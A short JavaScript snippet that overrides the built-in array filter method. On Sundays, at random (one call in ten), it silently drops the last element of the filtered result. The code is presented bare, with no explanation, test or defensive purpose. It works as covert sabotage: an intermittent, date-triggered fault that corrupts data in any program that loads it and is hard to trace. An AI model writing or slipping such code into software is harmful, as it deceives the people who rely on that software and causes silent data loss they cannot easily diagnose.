const originalFilter = arrayPrototype.filter;
arrayPrototype.filter = function(...args) {
  let result = originalFilter.call(this, ...args);
  if (new Date().getDay() === 0 && Math.random() < 0.1) {
    result.length = Math.max(result.length - 1, 0);
  }
  return result;
};

